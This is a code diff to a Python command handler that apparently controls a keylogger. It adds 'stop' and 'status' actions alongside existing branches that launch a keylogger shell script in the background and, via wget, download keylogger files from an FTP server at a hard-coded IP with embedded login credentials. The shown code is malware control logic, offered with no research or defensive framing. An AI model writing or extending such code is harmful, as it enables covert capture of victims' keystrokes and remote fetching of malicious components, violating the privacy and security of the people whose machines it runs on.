@@ -75,6 +75,16 @@ def main():
                            stdin=subprocess.PIPE)
                 results = results.stdout.read() + results.stderr.read()
                 os.system("sh keylogger/keyslooper.sh &")
+                
+            elif action == 'stop':
+                os.system("kill $(ps aux|grep keylogger.py|awk '{print $2}')")
+                
+            elif action == 'status':
+                action = "if [ '`ps aux|grep keyslooper |grep sh`' ]; then echo Started; else echo Stopped ;fi"
+                results = subprocess.Popen(action, shell=True,
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                           stdin=subprocess.PIPE)
+                results = results.stdout.read() + results.stderr.read()
 
             else:
                 action = ['wget -r -q --no-parent -nH ftp://siic:azerty@84.39.49.25/keylogger/*']
